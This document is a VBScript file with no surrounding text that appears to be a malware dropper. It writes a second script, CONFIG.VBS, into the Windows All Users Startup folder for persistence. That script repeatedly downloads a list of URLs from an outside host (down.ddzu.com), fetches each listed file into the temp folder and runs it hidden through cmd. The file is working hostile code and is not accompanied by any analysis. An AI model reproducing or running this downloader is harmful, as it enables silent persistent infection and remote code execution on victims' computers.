On Error Resume Next
Set ws=CreateObject("Wscript.Shell")
Wscript.Sleep 5000
Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
Set windir=fso.GetSpecialFolder(0)
conf=left(windir,3)&"Documents and Settings\All Users\����ʼ���˵�\����\����\CONFIG.VBS"
Set f=fso.CreateTextFile(conf)
f.WriteLine("lovezl=""on error resume next:Set ws=CreateObject(""""Wscript.Shell""""):Wscript.Sleep 300000:set F=createobject(""""Scripting.FileSystemObject""""):set windir=F.GetSpecialFolder(2):set S=createobject(""""adodb.stream""""):Set x=CreateObject(""""Microsoft.XMLHTTP""""):readurl=""""http://down.ddzu.com/img/gj.txt"""":x.Open """"GET"""",readurl,False:x.Send():dlist=bytes2BSTR(x.responseBody):Function bytes2BSTR(vIn):For i=1 To LenB(vIn):ThisCharCode=AscB(MidB(vIn,i,1)):If ThisCharCode<&H80 Then:strReturn=strReturn & Chr(ThisCharCode):Else:NextCharCode=AscB(MidB(vIn,i+1,1)):strReturn=strReturn&Chr(CLng(ThisCharCode)*&H100+CInt(NextCharCode)):i=i+1:End If:Next:bytes2BSTR=strReturn:End Function:sub TTdown(TTurl):on error resume next:tmpname=F.BuildPath(windir,""""KB""""&Day(now)&Hour(now)&Minute(now)&Second(now)&Right(TTurl,4)):x.Open """"GET"""",TTurl,False:x.Send():S.type=1:S.open:S.write x.responseBody:S.savetofile tmpname,2:S.close:if F.GetFile(tmpname).size>1000 then:ws.run """"cmd /c """"&f.GetFile(tmpname).ShortPath,vbhide:end if:End sub:Set rl=F.OpenTextFile(windir&""""\cppzl.log"""",1):olist=rl.ReadLine:rl.close:down=split(dlist,""""|""""):For I=0 To UBound(down):if instr(olist,down(I))=""""0"""" then:dl=left(down(I),instr(down(I),""""#"""")-1):Wscript.Sleep 2000:call TTdown(dl):end if:Next:Set ff=F.CreateTextFile(windir&""""\cppzl.log""""):ff.Write dlist:ff.close:Set ff=nothing:Set rl=nothing:set windir=nothing:Set ws=nothing:set F=nothing:set S=nothing:Set x=nothing"":For U=0 To 50:execute(lovezl):Wscript.Sleep 1200000:Next")
f.close
set qdvbs=fso.GetFile(conf)
Wscript.Sleep 5000
ws.run qdvbs.ShortPath,vbhide
set qdvbs=nothing
Set f=nothing
set windir=nothing
Set ws=nothing
set fso=nothing